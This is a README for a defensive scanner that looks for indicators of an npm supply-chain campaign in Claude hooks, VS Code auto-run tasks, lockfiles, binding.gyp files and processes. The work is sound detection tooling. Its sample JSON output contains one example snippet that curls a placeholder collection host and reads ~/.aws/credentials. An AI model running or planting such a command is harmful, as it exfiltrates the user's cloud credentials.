# Miasma / Phantom Gyp Scanner

`scanner.py` is a local IOC scanner for the 2026 `@redhat-cloud-services` npm supply-chain campaign associated with Miasma / Phantom Gyp reporting. It is meant to help a developer inspect a machine or workspace for likely persistence, suspicious project startup tasks, affected package references, and related high-risk behavior.

The scanner is intentionally heuristic. It does not claim a host is clean, and it does not replace incident response. Its current design goal is practical triage with lower false-positive noise than a raw pattern grep.

## What It Checks

- `~/.claude/settings.json` for suspicious hook commands and unusual auto-run startup behavior.
- `.vscode/tasks.json` for suspicious tasks, especially `runOn: "folderOpen"` auto-run tasks.
- `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`, and direct `node_modules` presence for known affected `@redhat-cloud-services` packages from the first wave.
- `binding.gyp` files for suspicious shell execution and Phantom Gyp-style indicators.
- Running processes for tunneling or inline execution patterns unless `--no-processes` is used.
- `~/.npmrc` for a stored npm token, since stolen publish tokens are useful for propagation.
- Local credential-store exposure as informational context.

## False-Positive Strategy

The scanner uses weighted indicators instead of treating every pattern match as malicious. A single weak signal such as `node -e` or `.npmrc` access should not be enough to trigger a severe result on its own.

It is stricter in auto-run contexts:

- Claude `SessionStart` hooks
- VS Code `folderOpen` tasks

It is more tolerant of common developer commands such as:

- `npm run build`
- `pnpm test`
- `make`
- `git status`

## Usage

By default, `python3 scanner.py` shows help. Use `--run` to start a scan.

Normal scans skip common test/demo/fixture paths such as `tests/`, `corpus/`, `fixtures/`, and `examples/`. Use `--test` if you intentionally want those directories included.

Show the available options:

```bash
python3 scanner.py --help
```

Current help output:

```text
usage: scanner.py [-h] [--run] [--no-processes] [--json] [--test] [paths ...]

Scan for Miasma / Phantom Gyp (TeamPCP) campaign IOCs

positional arguments:
  paths           Directories to scan when using --run (default: HOME + cwd)

options:
  -h, --help      show this help message and exit
  --run           Run the scanner
  --no-processes  Skip live process scan
  --json          Emit findings as JSON
  --test          Include test/demo/fixture directories in the scan
```

Common command recipes:

```bash
# Show help
python3 scanner.py

# Scan your home directory and current working directory
python3 scanner.py --run

# Scan a specific project only
python3 scanner.py --run /path/to/project

# Scan multiple paths
python3 scanner.py --run /path/to/project /another/path

# Skip live process inspection
python3 scanner.py --run --no-processes /path/to/project

# Emit JSON for piping into other tools
python3 scanner.py --run --json --no-processes /path/to/project

# Include test/demo fixtures intentionally
python3 scanner.py --run --test .
```

Show help:

```bash
python3 scanner.py
```

Run against the current directory and your home directory:

```bash
python3 scanner.py --run
```

Run against specific paths:

```bash
python3 scanner.py --run /path/to/project /another/path
```

Skip the live process scan:

```bash
python3 scanner.py --run --no-processes
```

Emit JSON for automation:

```bash
python3 scanner.py --run --json --no-processes /path/to/project
```

Include test/demo/fixture directories in the scan:

```bash
python3 scanner.py --run --test /path/to/project
```

Sample JSON output:

```json
{
  "findings": [
    {
      "severity": "CRITICAL",
      "category": "vscode_tasks",
      "path": "/path/to/project/.vscode/tasks.json",
      "detail": "Auto-run task (folderOpen) with suspicious pattern(s): outbound curl, AWS credential access",
      "snippet": "bash -lc curl https://example.invalid/collect && cat ~/.aws/credentials"
    }
  ],
  "summary": {
    "CRITICAL": 1,
    "HIGH": 0,
    "MEDIUM": 0,
    "INFO": 0
  }
}
```

## Output

The scanner reports these severities:

- `CRITICAL`: strong malicious indicators or known affected-package matches in a risky context.
- `HIGH`: suspicious behavior that needs prompt review.
- `MEDIUM`: unusual behavior worth verifying, but with weaker confidence.
- `INFO`: context that may matter during triage but is not itself evidence of compromise.

Exit codes:

- `0`: no `CRITICAL`, `HIGH`, or `MEDIUM` findings
- `1`: at least one `HIGH` or `MEDIUM` finding
- `2`: at least one `CRITICAL` finding

## Tests

The repository includes a fixture-backed test corpus under [`tests/corpus`](./tests/corpus). It contains both benign and malicious samples for:

- Claude hooks
- VS Code tasks
- `binding.gyp`
- lockfiles

Those fixture directories are excluded from normal scans by default. Use `--test` if you want to scan them on purpose.

Run the test suite:

```bash
python3 -m unittest discover -s tests -v
```

Syntax-check the code:

```bash
python3 -m py_compile scanner.py tests/test_scanner.py
```

## Scope and Limits

- The first-wave package list is explicit; second-wave detection is still heuristic.
- The scanner does not fetch live advisories or compare installed package publish timestamps.
- A clean report is not proof of safety.
- A finding should be reviewed in context before taking destructive action.

## Files

- [`scanner.py`](./scanner.py): scanner implementation and CLI
- [`tests/test_scanner.py`](./tests/test_scanner.py): test suite
- [`tests/corpus`](./tests/corpus): benign and malicious fixtures
